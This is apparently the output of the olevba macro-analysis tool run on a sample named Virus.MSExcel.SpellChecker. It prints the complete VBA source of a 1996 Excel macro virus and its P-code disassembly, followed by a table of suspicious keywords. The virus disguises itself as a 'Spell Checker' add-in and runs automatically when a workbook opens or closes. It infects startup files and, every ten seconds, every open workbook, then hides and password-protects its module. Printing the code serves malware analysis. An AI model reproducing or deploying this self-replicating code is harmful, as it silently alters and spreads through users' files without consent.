olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.SpellChecker
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle4.cls 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle5.cls 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle6.cls 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle7.cls 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle8.cls 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle9.cls 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSExcel.bas 
in file: ./Virus.MSExcel.SpellChecker - OLE stream: '_VBA_PROJECT_CUR/VBA/MSExcel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Date Virus.
' Created: May 1, 1996.
'
' NOTE:
' The Date Virus was inspired by the Laroux virus.  While this particular
' macro virus is harmless, others are not!  This macro virus was developed
' to bring attention to the possible threat in the hopes that antivirus software
' will be developed to protect this application.

Public NextSchedule
Public Running

Function HasAddIn() As Boolean
Attribute HasAddIn.VB_ProcData.VB_Invoke_Func = " \n14"
    HasAddIn = False
    For Each prog In AddIns
        If prog.Name = "SPELLCK.XLA" Then HasAddIn = True: Exit For
    Next
End Function

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
    If (ThisWorkbook.Name = "SPELLCK.XLA") Then Exit Sub
    If Running = False Then Exit Sub

    For Each book In Workbooks
       If book.Name <> ThisWorkbook.Name Then
          For Each modul In book.Modules
             If modul.Name = "MSExcel" Then
                Application.OnTime Now, book.Name & "!MSExcel.RepeatInfect"
             End If
          Next
       End If
    Next

    Application.OnTime NextSchedule, ThisWorkbook.Name & "!MSExcel.RepeatInfect", , False
    Application.DisplayAlerts = False
    ThisWorkbook.Close
End Sub

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim fname As String
    Dim WB, WS As String
        
    If (ThisWorkbook.Name = "SPELLCK.XLA") Then Payload
    
    Counter = 0: AppInfected = False: WB = WS = ""
    
    On Error Resume Next
    WS = ActiveSheet.Name
    WB = ActiveWorkbook.Name
    On Error GoTo GotError

    ' don't want to leave the Mac users out of the fun!
    If (Left(Application.OperatingSystem, 3) = "Mac") Then
        fname = CurDir() & Application.PathSeperator & "SPELLCK.XLA"
    Else
        fname = "C:\SPELLCK.XLA"
    End If
    
    If (Dir(fname) = "") Then
       ThisWorkbook.Activate
       ThisWorkbook.Title = "Spell Checker"
       addinfname = "VBA.MAKE.ADDIN(""" & fname & """)"
       ExecuteExcel4Macro addinfname
       On Error Resume Next
       Workbooks(WB).Activate
       Worksheets(WS).Activate
       On Error GoTo GotError
    End If

    If HasAddIn = True Then
       If (AddIns("Spell Checker").Installed = False) Then AddIns("Spell Checker").Installed = True
    Else
       AddIns.Add(fname, False).Installed = True
    End If
    
    For Each book In Workbooks
       If book.Name <> ThisWorkbook.Name Then
          For Each modul In book.Modules
             If modul.Name = "MSExcel" Then
                Running = False
                Exit Sub
             End If
          Next
       End If
    Next

    ' attempt to infect the user's startup files.
    If (Left(Application.OperatingSystem, 3) = "Mac") Then
       StartFile = Dir(Application.StartupPath, MacID("XCEL"))
    Else
       StartFile = Dir(Application.StartupPath & Application.PathSeparator & "*.XLS")
    End If
    If ((StartFile <> "") And (StartFile <> ThisWorkbook.Name)) Then
       On Error Resume Next
       Workbooks.Open(Application.StartupPath & Application.PathSeparator & StartFile).Activate
       Infect
       ActiveWorkbook.Save
       ActiveWorkbook.Close
       Workbooks(WB).Activate
       Worksheets(WS).Activate
       On Error GoTo GotError
    End If
    If (Left(Application.OperatingSystem, 3) = "Mac") Then
       StartFile = Dir(Application.AltStartupPath, MacID("XCEL"))
    Else
       StartFile = Dir(Application.AltStartupPath & Application.PathSeparator & "*.XLS")
    End If
    If ((StartFile <> "") And (StartFile <> ThisWorkbook.Name)) Then
       On Error Resume Next
       Workbooks.Open(Application.AltStartupPath & Application.PathSeparator & StartFile).Activate
       Infect
       ActiveWorkbook.Save
       ActiveWorkbook.Close
       Workbooks(WB).Activate
       Worksheets(WS).Activate
       On Error GoTo GotError
    End If

GotError:
   RepeatInfect
End Sub

Function RepeatInfect()
Attribute RepeatInfect.VB_ProcData.VB_Invoke_Func = " \n14"
    Running = True
    On Error GoTo GotError
    
    NextSchedule = Now + TimeValue("00:00:10")
    Application.OnTime NextSchedule, ThisWorkbook.Name & "!MSExcel.RepeatInfect"
    Infect

    Exit Function

GotError:
End Function

Function Infect()
Attribute Infect.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim WB, WS As String
    Dim Uninfected As Boolean
    
    On Error Resume Next
    WB = ActiveWorkbook.Name
    WS = ActiveSheet.Name
   
    For Each book In Workbooks
       Uninfected = True
       If book.Name <> ThisWorkbook.Name Then
          For Each modul In book.Modules
             If modul.Name = "MSExcel" Then
                Uninfected = False
             End If
          Next
          If Uninfected Then
             ThisWorkbook.Activate
             ThisWorkbook.Modules("MSExcel").Copy after:=book.Worksheets(book.Worksheets.Count)
             book.Title = "Spell Checker"
             book.Modules("MSExcel").Visible = False
             book.Modules("MSExcel").Protect password:=Date$
             
             ' return the user to the previously active window.
             Workbooks(WB).Activate
             Worksheets(WS).Activate
             book.Save 'save the worksheet to complete infection.
          End If
       End If
    Next
End Function

Function Payload()
Attribute Payload.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnTime Now + TimeValue("00:03:00"), "SPELLCK.XLA!Payload"
    MsgBox "Just in case you didn't know, the current date is: " & Chr(13) & Chr(13) & Now & Chr(13) & Chr(13) & "Thank you for using Microsoft Excel!"
End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSExcel.SpellChecker
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/DieseArbeitsmappe - 970 bytes
' _VBA_PROJECT_CUR/VBA/Tabelle1 - 959 bytes
' _VBA_PROJECT_CUR/VBA/Tabelle2 - 959 bytes
' _VBA_PROJECT_CUR/VBA/Tabelle3 - 959 bytes
' _VBA_PROJECT_CUR/VBA/Tabelle4 - 959 bytes
' _VBA_PROJECT_CUR/VBA/Tabelle5 - 959 bytes
' _VBA_PROJECT_CUR/VBA/Tabelle6 - 959 bytes
' _VBA_PROJECT_CUR/VBA/Tabelle7 - 959 bytes
' _VBA_PROJECT_CUR/VBA/Tabelle8 - 959 bytes
' _VBA_PROJECT_CUR/VBA/Tabelle9 - 959 bytes
' _VBA_PROJECT_CUR/VBA/MSExcel - 10396 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x000C " Date Virus."
' Line #2:
' 	QuoteRem 0x0000 0x0016 " Created: May 1, 1996."
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	QuoteRem 0x0000 0x0006 " NOTE:"
' Line #5:
' 	QuoteRem 0x0000 0x0048 " The Date Virus was inspired by the Laroux virus.  While this particular"
' Line #6:
' 	QuoteRem 0x0000 0x0049 " macro virus is harmless, others are not!  This macro virus was developed"
' Line #7:
' 	QuoteRem 0x0000 0x004F " to bring attention to the possible threat in the hopes that antivirus software"
' Line #8:
' 	QuoteRem 0x0000 0x002F " will be developed to protect this application."
' Line #9:
' Line #10:
' 	Dim (Public) 
' 	VarDefn NextSchedule
' Line #11:
' 	Dim (Public) 
' 	VarDefn Running
' Line #12:
' Line #13:
' 	FuncDefn (Function HasAddIn() As Boolean)
' Line #14:
' 	LitVarSpecial (False)
' 	St HasAddIn 
' Line #15:
' 	StartForVariable 
' 	Ld prog 
' 	EndForVariable 
' 	Ld AddIns 
' 	ForEach 
' Line #16:
' 	Ld prog 
' 	MemLd New 
' 	LitStr 0x000B "SPELLCK.XLA"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St HasAddIn 
' 	BoS 0x0000 
' 	ExitFor 
' 	EndIf 
' Line #17:
' 	StartForVariable 
' 	Next 
' Line #18:
' 	EndFunc 
' Line #19:
' Line #20:
' 	FuncDefn (Sub Auto_Close())
' Line #21:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x000B "SPELLCK.XLA"
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #22:
' 	Ld Running 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Ld book 
' 	EndForVariable 
' 	Ld Workbooks 
' 	ForEach 
' Line #25:
' 	Ld book 
' 	MemLd New 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	StartForVariable 
' 	Ld modul 
' 	EndForVariable 
' 	Ld book 
' 	MemLd Modules 
' 	ForEach 
' Line #27:
' 	Ld modul 
' 	MemLd New 
' 	LitStr 0x0007 "MSExcel"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	Ld Now 
' 	Ld book 
' 	MemLd New 
' 	LitStr 0x0015 "!MSExcel.RepeatInfect"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Next 
' Line #33:
' Line #34:
' 	Ld NextSchedule 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x0015 "!MSExcel.RepeatInfect"
' 	Concat 
' 	ParamOmitted 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0004 
' Line #35:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #36:
' 	Ld ThisWorkbook 
' 	ArgsMemCall Close 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	FuncDefn (Sub Auto_Open())
' Line #40:
' 	Dim 
' 	VarDefn fname (As String)
' Line #41:
' 	Dim 
' 	VarDefn WB
' 	VarDefn WS (As String)
' Line #42:
' Line #43:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x000B "SPELLCK.XLA"
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Payload 0x0000 
' 	EndIf 
' Line #44:
' Line #45:
' 	LitDI2 0x0000 
' 	St Counter 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St AppInfected 
' 	BoS 0x0000 
' 	Ld WS 
' 	LitStr 0x0000 ""
' 	Eq 
' 	St WB 
' Line #46:
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	Ld ActiveSheet 
' 	MemLd New 
' 	St WS 
' Line #49:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St WB 
' Line #50:
' 	OnError GotError 
' Line #51:
' Line #52:
' 	QuoteRem 0x0004 0x0032 " don't want to leave the Mac users out of the fun!"
' Line #53:
' 	Ld Application 
' 	MemLd OperatingSystem 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Mac"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #54:
' 	ArgsLd CurDir 0x0000 
' 	Ld Application 
' 	MemLd PathSeperator 
' 	Concat 
' 	LitStr 0x000B "SPELLCK.XLA"
' 	Concat 
' 	St fname 
' Line #55:
' 	ElseBlock 
' Line #56:
' 	LitStr 0x000E "C:\SPELLCK.XLA"
' 	St fname 
' Line #57:
' 	EndIfBlock 
' Line #58:
' Line #59:
' 	Ld fname 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #60:
' 	Ld ThisWorkbook 
' 	ArgsMemCall Activate 0x0000 
' Line #61:
' 	LitStr 0x000D "Spell Checker"
' 	Ld ThisWorkbook 
' 	MemSt Title 
' Line #62:
' 	LitStr 0x0010 "VBA.MAKE.ADDIN(""
' 	Ld fname 
' 	Concat 
' 	LitStr 0x0002 "")"
' 	Concat 
' 	St addinfname 
' Line #63:
' 	Ld addinfname 
' 	ArgsCall ExecuteExcel4Macro 0x0001 
' Line #64:
' 	OnError (Resume Next) 
' Line #65:
' 	Ld WB 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #66:
' 	Ld WS 
' 	ArgsLd Worksheets 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #67:
' 	OnError GotError 
' Line #68:
' 	EndIfBlock 
' Line #69:
' Line #70:
' 	Ld HasAddIn 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #71:
' 	LitStr 0x000D "Spell Checker"
' 	ArgsLd AddIns 0x0001 
' 	MemLd Installed 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	LitStr 0x000D "Spell Checker"
' 	ArgsLd AddIns 0x0001 
' 	MemSt Installed 
' 	EndIf 
' Line #72:
' 	ElseBlock 
' Line #73:
' 	LitVarSpecial (True)
' 	Ld fname 
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemLd Add 0x0002 
' 	MemSt Installed 
' Line #74:
' 	EndIfBlock 
' Line #75:
' Line #76:
' 	StartForVariable 
' 	Ld book 
' 	EndForVariable 
' 	Ld Workbooks 
' 	ForEach 
' Line #77:
' 	Ld book 
' 	MemLd New 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #78:
' 	StartForVariable 
' 	Ld modul 
' 	EndForVariable 
' 	Ld book 
' 	MemLd Modules 
' 	ForEach 
' Line #79:
' 	Ld modul 
' 	MemLd New 
' 	LitStr 0x0007 "MSExcel"
' 	Eq 
' 	IfBlock 
' Line #80:
' 	LitVarSpecial (False)
' 	St Running 
' Line #81:
' 	ExitSub 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	StartForVariable 
' 	Next 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	StartForVariable 
' 	Next 
' Line #86:
' Line #87:
' 	QuoteRem 0x0004 0x002C " attempt to infect the user's startup files."
' Line #88:
' 	Ld Application 
' 	MemLd OperatingSystem 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Mac"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #89:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0004 "XCEL"
' 	ArgsLd MacID 0x0001 
' 	ArgsLd Dir 0x0002 
' 	St StartFile 
' Line #90:
' 	ElseBlock 
' Line #91:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	LitStr 0x0005 "*.XLS"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St StartFile 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	Ld StartFile 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld StartFile 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld StartFile 
' 	Concat 
' 	Ld Workbooks 
' 	ArgsMemLd Option 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #96:
' 	ArgsCall Infect 0x0000 
' Line #97:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #98:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Close 0x0000 
' Line #99:
' 	Ld WB 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #100:
' 	Ld WS 
' 	ArgsLd Worksheets 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #101:
' 	OnError GotError 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	Ld Application 
' 	MemLd OperatingSystem 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Mac"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #104:
' 	Ld Application 
' 	MemLd AltStartupPath 
' 	LitStr 0x0004 "XCEL"
' 	ArgsLd MacID 0x0001 
' 	ArgsLd Dir 0x0002 
' 	St StartFile 
' Line #105:
' 	ElseBlock 
' Line #106:
' 	Ld Application 
' 	MemLd AltStartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	LitStr 0x0005 "*.XLS"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St StartFile 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	Ld StartFile 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld StartFile 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #109:
' 	OnError (Resume Next) 
' Line #110:
' 	Ld Application 
' 	MemLd AltStartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld StartFile 
' 	Concat 
' 	Ld Workbooks 
' 	ArgsMemLd Option 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #111:
' 	ArgsCall Infect 0x0000 
' Line #112:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #113:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Close 0x0000 
' Line #114:
' 	Ld WB 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #115:
' 	Ld WS 
' 	ArgsLd Worksheets 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #116:
' 	OnError GotError 
' Line #117:
' 	EndIfBlock 
' Line #118:
' Line #119:
' 	Label GotError 
' Line #120:
' 	ArgsCall RepeatInfect 0x0000 
' Line #121:
' 	EndSub 
' Line #122:
' Line #123:
' 	FuncDefn (Function RepeatInfect())
' Line #124:
' 	LitVarSpecial (True)
' 	St Running 
' Line #125:
' 	OnError GotError 
' Line #126:
' Line #127:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:10"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	St NextSchedule 
' Line #128:
' 	Ld NextSchedule 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x0015 "!MSExcel.RepeatInfect"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #129:
' 	ArgsCall Infect 0x0000 
' Line #130:
' Line #131:
' 	ExitFunc 
' Line #132:
' Line #133:
' 	Label GotError 
' Line #134:
' 	EndFunc 
' Line #135:
' Line #136:
' 	FuncDefn (Function Infect())
' Line #137:
' 	Dim 
' 	VarDefn WB
' 	VarDefn WS (As String)
' Line #138:
' 	Dim 
' 	VarDefn Uninfected (As Boolean)
' Line #139:
' Line #140:
' 	OnError (Resume Next) 
' Line #141:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St WB 
' Line #142:
' 	Ld ActiveSheet 
' 	MemLd New 
' 	St WS 
' Line #143:
' Line #144:
' 	StartForVariable 
' 	Ld book 
' 	EndForVariable 
' 	Ld Workbooks 
' 	ForEach 
' Line #145:
' 	LitVarSpecial (True)
' 	St Uninfected 
' Line #146:
' 	Ld book 
' 	MemLd New 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #147:
' 	StartForVariable 
' 	Ld modul 
' 	EndForVariable 
' 	Ld book 
' 	MemLd Modules 
' 	ForEach 
' Line #148:
' 	Ld modul 
' 	MemLd New 
' 	LitStr 0x0007 "MSExcel"
' 	Eq 
' 	IfBlock 
' Line #149:
' 	LitVarSpecial (False)
' 	St Uninfected 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	StartForVariable 
' 	Next 
' Line #152:
' 	Ld Uninfected 
' 	IfBlock 
' Line #153:
' 	Ld ThisWorkbook 
' 	ArgsMemCall Activate 0x0000 
' Line #154:
' 	Ld book 
' 	MemLd Worksheets 
' 	MemLd Count 
' 	Ld book 
' 	ArgsMemLd Worksheets 0x0001 
' 	ParamNamed after 
' 	LitStr 0x0007 "MSExcel"
' 	Ld ThisWorkbook 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #155:
' 	LitStr 0x000D "Spell Checker"
' 	Ld book 
' 	MemSt Title 
' Line #156:
' 	LitVarSpecial (False)
' 	LitStr 0x0007 "MSExcel"
' 	Ld book 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #157:
' 	Ld Date$ 
' 	ParamNamed password 
' 	LitStr 0x0007 "MSExcel"
' 	Ld book 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Protect 0x0001 
' Line #158:
' Line #159:
' 	QuoteRem 0x000D 0x0031 " return the user to the previously active window."
' Line #160:
' 	Ld WB 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #161:
' 	Ld WS 
' 	ArgsLd Worksheets 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #162:
' 	Ld book 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0017 0x0029 "save the worksheet to complete infection."
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	StartForVariable 
' 	Next 
' Line #166:
' 	EndFunc 
' Line #167:
' Line #168:
' 	FuncDefn (Function Payload())
' Line #169:
' 	Ld Now 
' 	LitStr 0x0008 "00:03:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0013 "SPELLCK.XLA!Payload"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #170:
' 	LitStr 0x0033 "Just in case you didn't know, the current date is: "
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0024 "Thank you for using Microsoft Excel!"
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #171:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Application.AltStart|May change which directory contains files to |
|          |upPath              |open at startup                              |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |\!                  |XCEL                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

